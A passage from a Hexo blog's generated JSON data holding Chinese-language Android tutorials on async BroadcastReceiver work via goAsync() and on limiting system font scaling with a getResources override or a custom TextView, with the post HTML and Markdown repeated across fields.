sHandler.removeMessages(what);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">AsyncHandler</span><span class=\"params\">()</span> &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后，我们可以回味一下BroadcastReceiver源码是怎么描述PendingResult和goAsync的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * State for a result that is pending for a broadcast receiver.  Returned</span></span><br><span class=\"line\"><span class=\"comment\">     * by &#123;<span class=\"doctag\">@link</span> BroadcastReceiver#goAsync() goAsync()&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * while in &#123;<span class=\"doctag\">@link</span> BroadcastReceiver#onReceive BroadcastReceiver.onReceive()&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     * This allows you to return from onReceive() without having the broadcast</span></span><br><span class=\"line\"><span class=\"comment\">     * terminate; you must call &#123;<span class=\"doctag\">@link</span> #finish()&#125; once you are done with the</span></span><br><span class=\"line\"><span class=\"comment\">     * broadcast.  This allows you to process the broadcast off of the main</span></span><br><span class=\"line\"><span class=\"comment\">     * thread of your app.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * &lt;p&gt;Note on threading: the state inside of this class is not itself</span></span><br><span class=\"line\"><span class=\"comment\">     * thread-safe, however you can use it from any thread if you properly</span></span><br><span class=\"line\"><span class=\"comment\">     * sure that you do not have races.  Typically this means you will hand</span></span><br><span class=\"line\"><span class=\"comment\">     * the entire object to another thread, which will be solely responsible</span></span><br><span class=\"line\"><span class=\"comment\">     * for setting any results and finally calling &#123;<span class=\"doctag\">@link</span> #finish()&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PendingResult</span> &#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This can be called by an application in &#123;<span class=\"doctag\">@link</span> #onReceive&#125; to allow</span></span><br><span class=\"line\"><span class=\"comment\">     * it to keep the broadcast active after returning from that function.</span></span><br><span class=\"line\"><span class=\"comment\">     * This does &lt;em&gt;not&lt;/em&gt; change the expectation of being relatively</span></span><br><span class=\"line\"><span class=\"comment\">     * responsive to the broadcast (finishing it within 10s), but does allow</span></span><br><span class=\"line\"><span class=\"comment\">     * the implementation to move work related to it over to another thread</span></span><br><span class=\"line\"><span class=\"comment\">     * to avoid glitching the main UI thread due to disk IO.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> Returns a &#123;<span class=\"doctag\">@link</span> PendingResult&#125; representing the result of</span></span><br><span class=\"line\"><span class=\"comment\">     * the active broadcast.  The BroadcastRecord itself is no longer active;</span></span><br><span class=\"line\"><span class=\"comment\">     * all data and other interaction must go through &#123;<span class=\"doctag\">@link</span> PendingResult&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * APIs.  The &#123;<span class=\"doctag\">@link</span> PendingResult#finish PendingResult.finish()&#125; method</span></span><br><span class=\"line\"><span class=\"comment\">     * must be called once processing of the broadcast is done.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> PendingResult <span class=\"title function_\">goAsync</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">PendingResult</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> mPendingResult;</span><br><span class=\"line\">        mPendingResult = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>广播回调onReceive是在主线程跑的，所以我们不能在里面搞耗时操作，不然秒秒钟ANR。</p>\n<p>又因为onReceive中的代码在执行完后，BroadcastReceiver对象就无效了，生命周期结束。<br>所以我们不能直接在里面起子线程，若应用进程被回收掉，线程的任务就可能无法完成。徒增不可控因素。</p>\n<p><strong>解决：</strong><br>普遍的处理方式是在onReceive中再起一个IntentService去执行异步操作。这样就有了Service组件的保障，进程不会被轻易杀掉，但同时这个操作也比较重，代码实现上还得再去写个处理特殊业务的IntentService。</p>\n<p>比如说我在onReceive里面只做一些很简单的耗时操作，可能就一两行代码我也要去写个Service？显然谷歌爹已经想到了这一点。</p>\n<p>在API 11以后，BroadcastReceiver新增了一个静态内部类PendingResult，我们可以通过调用goAsync()方法来获取这个PendingResult对象，然后就可以愉快地进行子线程操作了，最后通过调用它的finish方法来结束广播接收者的生命。一切就变得可控了（相当于强行给Receiver续命）。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(<span class=\"keyword\">final</span> Context context, <span class=\"keyword\">final</span> Intent intent)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">PendingResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> goAsync();</span><br><span class=\"line\">        AsyncHandler.post(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 在这里搞事情</span></span><br><span class=\"line\">                ...</span><br><span class=\"line\">                <span class=\"comment\">// 成功续命，可以手动结束了</span></span><br><span class=\"line\">                result.finish();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>要注意的是，尽管这里可以异步操作，但耗时超过10s依然会爆ANR。</strong><br>其中AsyncHandler是一个简单封装的可复用的异步操作类（来自Android源码）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Helper class for managing the background thread used to perform io operations</span></span><br><span class=\"line\"><span class=\"comment\"> * and handle async broadcasts.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AsyncHandler</span> &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">HandlerThread</span> <span class=\"variable\">sHandlerThread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HandlerThread</span>(<span class=\"string\">&quot;AsyncHandler&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Handler sHandler;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        sHandlerThread.start();</span><br><span class=\"line\">        sHandler = <span class=\"keyword\">new</span> <span class=\"title class_\">Handler</span>(sHandlerThread.getLooper());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">post</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">        sHandler.post(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">postDelayed</span><span class=\"params\">(Runnable r, <span class=\"type\">long</span> delayedMills)</span> &#123;</span><br><span class=\"line\">        sHandler.postDelayed(r, delayedMills);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Message <span class=\"title function_\">obtain</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Message.obtain(sHandler, r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sendMessageDelayed</span><span class=\"params\">(Message message, <span class=\"type\">long</span> delayedMills)</span> &#123;</span><br><span class=\"line\">        sHandler.sendMessageDelayed(message, delayedMills);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">removeCallbacks</span><span class=\"params\">(<span class=\"type\">int</span> what)</span> &#123;</span><br><span class=\"line\">        sHandler.removeMessages(what);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">AsyncHandler</span><span class=\"params\">()</span> &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后，我们可以回味一下BroadcastReceiver源码是怎么描述PendingResult和goAsync的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * State for a result that is pending for a broadcast receiver.  Returned</span></span><br><span class=\"line\"><span class=\"comment\">     * by &#123;<span class=\"doctag\">@link</span> BroadcastReceiver#goAsync() goAsync()&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * while in &#123;<span class=\"doctag\">@link</span> BroadcastReceiver#onReceive BroadcastReceiver.onReceive()&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     * This allows you to return from onReceive() without having the broadcast</span></span><br><span class=\"line\"><span class=\"comment\">     * terminate; you must call &#123;<span class=\"doctag\">@link</span> #finish()&#125; once you are done with the</span></span><br><span class=\"line\"><span class=\"comment\">     * broadcast.  This allows you to process the broadcast off of the main</span></span><br><span class=\"line\"><span class=\"comment\">     * thread of your app.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * &lt;p&gt;Note on threading: the state inside of this class is not itself</span></span><br><span class=\"line\"><span class=\"comment\">     * thread-safe, however you can use it from any thread if you properly</span></span><br><span class=\"line\"><span class=\"comment\">     * sure that you do not have races.  Typically this means you will hand</span></span><br><span class=\"line\"><span class=\"comment\">     * the entire object to another thread, which will be solely responsible</span></span><br><span class=\"line\"><span class=\"comment\">     * for setting any results and finally calling &#123;<span class=\"doctag\">@link</span> #finish()&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PendingResult</span> &#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This can be called by an application in &#123;<span class=\"doctag\">@link</span> #onReceive&#125; to allow</span></span><br><span class=\"line\"><span class=\"comment\">     * it to keep the broadcast active after returning from that function.</span></span><br><span class=\"line\"><span class=\"comment\">     * This does &lt;em&gt;not&lt;/em&gt; change the expectation of being relatively</span></span><br><span class=\"line\"><span class=\"comment\">     * responsive to the broadcast (finishing it within 10s), but does allow</span></span><br><span class=\"line\"><span class=\"comment\">     * the implementation to move work related to it over to another thread</span></span><br><span class=\"line\"><span class=\"comment\">     * to avoid glitching the main UI thread due to disk IO.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> Returns a &#123;<span class=\"doctag\">@link</span> PendingResult&#125; representing the result of</span></span><br><span class=\"line\"><span class=\"comment\">     * the active broadcast.  The BroadcastRecord itself is no longer active;</span></span><br><span class=\"line\"><span class=\"comment\">     * all data and other interaction must go through &#123;<span class=\"doctag\">@link</span> PendingResult&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * APIs.  The &#123;<span class=\"doctag\">@link</span> PendingResult#finish PendingResult.finish()&#125; method</span></span><br><span class=\"line\"><span class=\"comment\">     * must be called once processing of the broadcast is done.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> PendingResult <span class=\"title function_\">goAsync</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">PendingResult</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> mPendingResult;</span><br><span class=\"line\">        mPendingResult = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"两种方法避免Android系统更改字体大小","subtitle":"开阔视野。","date":"2018-10-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n当用户更改系统的字体大小后，App界面可能会变得面目全非，适配起来非常困难。\n有的时候我们可能不需要去适配，那么就需要限制部分页面或者控件受系统字体大小更改的影响。\n\n目前，大家在网上搜，一般都是下面的这个办法，这也是今天介绍的第一个方法，可以直接使当前Activity的所有字体大小固定：\n\n```java\n@Override\npublic Resources getResources() {\n    Resources resources = super.getResources();\n    if (resources != null) {\n        Configuration configuration = resources.getConfiguration();\n        // 系统设置的字体大小超过了我们接受的限制\n        if (configuration != null && configuration.fontScale > mLimitFontScale) {\n            configuration.fontScale = mLimitFontScale; // 强制设置为自己想要的放大倍数\n            resources.updateConfiguration(configuration, resources.getDisplayMetrics());\n        }\n    }\n    return resources;\n}\n```\n\n这种方式主要是重写系统的getResources方法，来强制更新fontScale的值。但这个方法有个缺点，即会影响当前Activity所有字体，若我们只需要限制某个TextView的最大字体size，而不是全局，该怎么办呢？\n\n第二种方法，自定义TextView以局部控制字体大小上限：\n\n```java\npublic class LimitSizeTextView extends TextView {\n \n    private float mLimitFontScale = 0; // 若在TextView实例化时没有调用setLimitFontScale则默认值为0\n    private float mRealTextSize = 0;\n \n    public LimitSizeTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n    }\n \n    public void setLimitFontScale(float limitFontScale) {\n        this.mLimitFontScale = limitFontScale;\n    }\n \n    @Override\n    public void setText(CharSequence text, BufferType type) {\n        if (mLimitFontScale > 0 && !TextUtils.equals(text, getText())) {\n            super.setText(text, type);\n            // 若设置了最大字体尺寸，则强制改变size，避免系统超大字体等情况导致字体过大\n            float curFontScale = getResources().getConfiguration().fontScale;\n            if (curFontScale >= mLimitFontScale) {\n                if (mRealTextSize == 0) {\n                    // 字体大小只修正一次\n                    mRealTextSize = getTextSize() * (mLimitFontScale / curFontScale);\n                }\n                // 注意这里设置大小的单位是像素\n                setTextSize(TypedValue.COMPLEX_UNIT_PX, mRealTextSize);\n            }\n        } else {\n            super.setText(text, type);\n        }\n    }\n}\n```\n\n其实思想和第一种方法类似，都是“劫持”一下系统API，来达到我们的目的。\n","source":"_posts/2018-10-20-两种方法避免Android系统更改字体大小.md","raw":"---\nlayout:     post\ntitle:      两种方法避免Android系统更改字体大小\nsubtitle:   开阔视野。\ndate:       2018-10-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n当用户更改系统的字体大小后，App界面可能会变得面目全非，适配起来非常困难。\n有的时候我们可能不需要去适配，那么就需要限制部分页面或者控件受系统字体大小更改的影响。\n\n目前，大家在网上搜，一般都是下面的这个办法，这也是今天介绍的第一个方法，可以直接使当前Activity的所有字体大小固定：\n\n```java\n@Override\npublic Resources getResources() {\n    Resources resources = super.getResources();\n    if (resources != null) {\n        Configuration configuration = resources.getConfiguration();\n        // 系统设置的字体大小超过了我们接受的限制\n        if (configuration != null && configuration.fontScale > mLimitFontScale) {\n            configuration.fontScale = mLimitFontScale; // 强制设置为自己想要的放大倍数\n            resources.updateConfiguration(configuration, resources.getDisplayMetrics());\n        }\n    }\n    return resources;\n}\n```\n\n这种方式主要是重写系统的getResources方法，来强制更新fontScale的值。但这个方法有个缺点，即会影响当前Activity所有字体，若我们只需要限制某个TextView的最大字体size，而不是全局，该怎么办呢？\n\n第二种方法，自定义TextView以局部控制字体大小上限：\n\n```java\npublic class LimitSizeTextView extends TextView {\n \n    private float mLimitFontScale = 0; // 若在TextView实例化时没有调用setLimitFontScale则默认值为0\n    private float mRealTextSize = 0;\n \n    public LimitSizeTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n    }\n \n    public void setLimitFontScale(float limitFontScale) {\n        this.mLimitFontScale = limitFontScale;\n    }\n \n    @Override\n    public void setText(CharSequence text, BufferType type) {\n        if (mLimitFontScale > 0 && !TextUtils.equals(text, getText())) {\n            super.setText(text, type);\n            // 若设置了最大字体尺寸，则强制改变size，避免系统超大字体等情况导致字体过大\n            float curFontScale = getResources().getConfiguration().fontScale;\n            if (curFontScale >= mLimitFontScale) {\n                if (mRealTextSize == 0) {\n                    // 字体大小只修正一次\n                    mRealTextSize = getTextSize() * (mLimitFontScale / curFontScale);\n                }\n                // 注意这里设置大小的单位是像素\n                setTextSize(TypedValue.COMPLEX_UNIT_PX, mRealTextSize);\n            }\n        } else {\n            super.setText(text, type);\n        }\n    }\n}\n```\n\n其实思想和第一种方法类似，都是“劫持”一下系统API，来达到我们的目的。\n","slug":"两种方法避免Android系统更改字体大小","published":1,"updated":"2024-03-25T07:31:25.851Z","comments":1,"photos":[],"link":"","_id":"cluaufh0b0007the62ng4ecx9","content":"<p>当用户更改系统的字体大小后，App界面可能会变得面目全非，适配起来非常困难。<br>有的时候我们可能不需要去适配，那么就需要限制部分页面或者控件受系统字体大小更改的影响。</p>\n<p>目前，大家在网上搜，一般都是下面的这个办法，这也是今天介绍的第一个方法，可以直接使当前Activity的所有字体大小固定：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Resources <span class=\"title function_\">getResources</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Resources</span> <span class=\"variable\">resources</span> <span class=\"operator\">=</span> <span class=\"built_in\">super</span>.getResources();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (resources != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">Configuration</span> <span class=\"variable\">configuration</span> <span class=\"operator\">=</span> resources.getConfiguration();</span><br><span class=\"line\">        <span class=\"comment\">// 系统设置的字体大小超过了我们接受的限制</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (configuration != <span class=\"literal\">null</span> &amp;&amp; configuration.fontScale &gt; mLimitFontScale) &#123;</span><br><span class=\"line\">            configuration.fontScale = mLimitFontScale; <span class=\"comment\">// 强制设置为自己想要的放大倍数</span></span><br><span class=\"line\">            resources.updateConfiguration(configuration, resources.getDisplayMetrics());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resources;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这种方式主要是重写系统的getResources方法，来强制更新fontScale的值。但这个方法有个缺点，即会影响当前Activity所有字体，若我们只需要限制某个TextView的最大字体size，而不是全局，该怎么办呢？</p>\n<p>第二种方法，自定义TextView以局部控制字体大小上限：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">LimitSizeTextView</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TextView</span> &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">float</span> <span class=\"variable\">mLimitFontScale</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 若在TextView实例化时没有调用setLimitFontScale则默认值为0</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">float</span> <span class=\"variable\">mRealTextSize</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">LimitSizeTextView</span><span class=\"params\">(Context context, AttributeSet attrs)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(context, attrs);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setLimitFontScale</span><span class=\"params\">(<span class=\"type\">float</span> limitFontScale)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.mLimitFontScale = limitFontScale;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setText</span><span class=\"params\">(CharSequence text, BufferType type)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mLimitFontScale &gt; <span class=\"number\">0</span> &amp;&amp; !TextUtils.equals(text, getText())) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>.setText(text, type);</span><br><span class=\"line\">            <span class=\"comment\">// 若设置了最大字体尺寸，则强制改变size，避免系统超大字体等情况导致字体过大</span></span><br><span class=\"line\">            <span class=\"type\">float</span> <span class=\"variable\">curFontScale</span> <span class=\"operator\">=</span> getResources().getConfiguration().fontScale;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (curFontScale &gt;= mLimitFontScale) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mRealTextSize == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 字体大小只修正一次</span></span><br><span class=\"line\">                    mRealTextSize = getTextSize() * (mLimitFontScale / curFontScale);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">// 注意这里设置大小的单位是像素</span></span><br><span class=\"line\">                setTextSize(TypedValue.COMPLEX_UNIT_PX, mRealTextSize);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>.setText(text, type);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实思想和第一种方法类似，都是“劫持”一下系统API，来达到我们的目的。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>当用户更改系统的字体大小后，App界面可能会变得面目全非，适配起来非常困难。<br>有的时候我们可能不需要去适配，那么就需要限制部分页面或者控件受系统字体大小更改的影响。</p>\n<p>目前，大家在网上搜，一般都是下面的这个办法，这也是今天介绍的第一个方法，可以直接使当前Activity的所有字体大小固定：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 